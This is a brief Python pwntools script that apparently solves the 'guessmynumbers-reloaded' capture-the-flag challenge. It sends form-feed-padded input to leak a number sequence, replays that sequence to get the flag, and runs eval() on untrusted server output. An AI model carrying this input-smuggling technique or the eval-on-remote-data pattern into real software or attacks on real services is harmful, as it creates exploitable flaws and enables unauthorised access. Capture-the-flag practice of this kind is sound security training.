from pwn import *
import re

while True:
    r1 = remote('guessmynumbers-reloaded.c.unitedctf.ca', ssl=True, port=443)

    r1.recvuntil(b'Que dites-vous? >')
    r1.sendline(b"\f\f\f\f\f\f\f\f\f\f\f\f\f\f\f\f1,1,1,1,1,1,1,1,1,1")

    resp = r1.recvall().decode()
    sequence = eval(re.search(r"\[[^]]+\]", resp).group(0))
    
    r2 = remote('guessmynumbers-reloaded.c.unitedctf.ca', ssl=True, port=443)
    
    r2.sendline(b'\f\f\f\f\f\f\f\f\f\f\f\f\f\f\f\f\f' + ','.join([str(x) for x in sequence]).encode())
    resp = r2.recvall().decode()

    if 'flag' in resp:
        print(resp)
        exit()